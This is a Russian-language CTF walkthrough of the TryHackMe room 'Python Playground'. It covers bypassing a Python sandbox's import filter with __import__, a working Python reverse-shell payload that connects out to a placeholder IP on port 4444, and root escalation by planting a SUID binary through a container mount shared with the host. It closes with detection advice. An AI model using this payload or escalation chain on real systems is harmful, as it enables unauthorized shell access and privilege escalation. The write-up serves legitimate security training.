# Python Playground: «песочница», в которой остался `__import__`

**Машина:** [Python Playground](https://tryhackme.com/room/pythonplayground) (hard, Linux)
**Цепочка:** nikto → админка → Python-песочница → обход импортов → shared mount → SUID → root.

## Разведка

22 и 80. nikto находит `/admin.html` — там реально работающий логин и, в исходнике страницы, ссылка на `super-secret-admin-testing-panel.html` плюс JS, из которого собирается пароль. Панель исполняет Python-код.

## Обход «песочницы»

Импорты режут, но `__import__` — встроенная функция, её фильтр не трогает:

```python
s = __import__('socket'); sp = __import__('subprocess'); os = __import__('os'); pty = __import__('pty')
s = s.socket(s.AF_INET, s.SOCK_STREAM)
s.connect(("IP", 4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

curl и wget в окружении нет, поэтому используем Python. Декодируем JS из admin.html → пароль → SSH под юзером.

## Эскалация через shared mount

Песочница крутится в контейнере. Создаём в нём файл с уникальным именем, ищем на хосте — находим в `/var/log/`. Значит, `/mnt/log/` контейнера = `/var/log/` хоста, причём файлы пишутся от root. Пишем туда бинарник, вешаем SUID, юзер его запускает — root.

## Как обнаружить

В Python 3.8+ audit hook может регистрировать события импорта, в том числе при вызове `__import__('socket')`. Это наблюдение за выполнением, а не защита песочницы. На хосте стоит отслеживать запись исполняемых файлов в `/var/log` и установку SUID. Владельца файла недостаточно, чтобы определить контейнер-источник: сопоставление UID зависит от настроек user namespace.

## Заметка

В цепочке сочетаются доступный в клиентском коде пароль, обход фильтра импортов и общий каталог с правами, позволяющими создать SUID-файл. Для последнего шага важно, чтобы файловая система на хосте не была смонтирована с nosuid.
